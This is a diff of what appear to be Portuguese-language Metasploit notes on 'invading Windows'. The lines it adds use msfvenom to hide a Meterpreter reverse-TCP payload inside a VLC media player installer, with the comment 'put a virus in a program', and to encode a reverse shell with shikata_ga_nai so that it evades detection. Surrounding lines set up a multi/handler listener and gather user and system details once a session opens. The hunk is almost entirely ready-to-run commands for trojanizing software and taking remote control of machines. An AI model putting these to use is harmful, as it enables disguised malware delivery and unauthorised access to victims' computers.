@@ -373,11 +373,14 @@ Metasploit - Armitage
     init 0 -> desliga a maquina
   Ivandindo windows
     msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows -f exe LHOST=192.168.100.71 LPORT=4444 -o /root/teste.exe -> Enviar arquivo para windows para obter acesso
+    msfvenom -a x86 --platform Windows -x vlc-3.0.18-win32.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.100.71 lport=4444 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o vlc-media-player.exe  -> colocar virus em um programa
+    msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' lhost=192.168.100.71 lport=4444 -i 20 -f exe -o encoded_shell.exe -> encriptar o executavel
     use multi/handler
     set payload windows/x64/meterpreter/reverse_tcp
     set LHOST 192.168.100.71
     set LPORT 4444
     run
+    help
     getuid -> pegar o nome do usuario
     sysinfo -> informações do sistema
   AUTOPWN
